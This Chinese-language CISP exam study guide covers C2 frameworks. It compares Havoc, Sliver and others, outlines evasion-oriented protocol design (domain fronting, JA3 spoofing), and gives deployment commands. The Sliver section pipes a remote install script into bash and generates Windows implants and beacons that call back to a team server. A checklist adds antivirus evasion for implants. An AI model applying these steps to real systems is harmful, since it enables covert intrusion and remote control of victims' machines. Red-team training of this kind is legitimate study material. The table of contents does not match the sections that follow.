# C2 框架开发入门：Havoc / Sliver 原理与定制

> **📘 文档定位**：CISP 考试 渗透测试 高级 | 难度：⭐⭐⭐⭐⭐ | 预计阅读：30 分钟
>
> 深入讲解 C2（Command & Control）框架的设计原理与实战开发，覆盖 Havoc/Sliver 等开源 C2 的架构分析、协议定制、模块开发及检测对抗技术。

---

## 导航目录

- [一、C2 框架基础架构](#一c2-框架基础架构)
- [二、通信协议设计](#二通信协议设计)
- [三、Havoc 框架分析](#三havoc-框架分析)
- [四、Sliver 框架分析](#四sliver-框架分析)
- [五、C2 检测对抗](#五c2-检测对抗)
- [六、安全部署 Checklist](#六安全部署-checklist)
- [七、高分考点与知识巧记](#七高分考点与知识巧记)

---

## 一、主流 C2 框架对比

| 框架 | 语言 | 通信协议 | 特点 | 适用场景 |
|------|------|---------|------|---------|
| **Cobalt Strike** | Java | HTTP/HTTPS/DNS/SMB | 商业、功能最全 | 专业红队 |
| **Havoc** | Go/C | HTTP/HTTPS/SMB | 开源、现代化UI | Cobalt替代 |
| **Sliver** | Go | HTTP/mTLS/WireGuard/DNS | 多协议、多平台 | 跨平台红队 |
| **Mythic** | Python/Go | HTTP/WebSocket/DNS | 模块化Agent | 灵活定制 |
| **Nimbo-C2** | Nim | HTTP | 轻量、易免杀 | 学习/小规模 |
| **Covenant** | C# | HTTP/HTTPS | .NET生态 | Windows渗透 |

---

## 二、C2 通信协议设计

```
C2 协议设计关键点：

1. 流量伪装
   → 模拟正常Web流量（浏览器User-Agent/Referer/Cookie）
   → 使用CDN/Domain Fronting（隐藏真实C2地址）

2. 通信模式
   Poll模式：Agent定时向Team Server拉取任务
   Push模式：Team Server实时推送（长连接）
   Hybrid：短连接Poll + 长连接Command

3. 流量加密
   应用层加密（在HTTPS之上再加密一层）
   对称加密传输任务（AES-256-GCM）
   非对称加密初始密钥交换（ECDH）

4. JA3 指纹伪造
   TLS Client Hello中包含JA3指纹
   → 使用utls库伪造Chrome/Firefox的JA3指纹
```

---

## 三、Havoc 部署实战

```bash
# Havoc 部署
git clone https://github.com/HavocFramework/Havoc.git
cd Havoc

# Team Server
cd teamserver
go build -o havoc teamserver.go
./havoc server --profile profiles/havoc.yaotl

# Client
cd client
go build -o havoc-client havoc.go
./havoc-client

# 连接: localhost:40056
```

```
Havoc Profile 关键配置 (havoc.yaotl)：

  • Sleep时间、Jitter（休眠抖动 → 防检测）
  • User-Agent字符串伪装
  • URI路径伪装
  • Host Header伪装
  • TLS证书配置
  • Shellcode注入方式
  • 进程注入Parent PID伪装
```

---

## 四、Sliver 实战

```bash
# Sliver 部署
curl https://sliver.sh/install|bash

# 启动服务端
sliver-server

# 生成 Implant
generate --http teamserver.com --os windows --arch amd64 --format exe

# 生成 Beacon（定期回调模式）
generate beacon --http teamserver.com --seconds 60 --jitter 30

# 多协议Listener
http --lport 443
mtls --lport 8888
dns --domains c2.example.com
wg --lport 53

# 会话管理
sessions        # 查看所有会话
use <id>        # 进入会话
interactive     # 切换交互模式
```

---

## 五、Checklist

- [ ] C2框架选型（Havoc/Sliver/Mythic）
- [ ] C2 Profile配置(流量伪装/JA3指纹)
- [ ] Implant免杀改造
- [ ] CDN/Domain Fronting中转
- [ ] 通信加密(双层加密)
- [ ] 测试环境验证
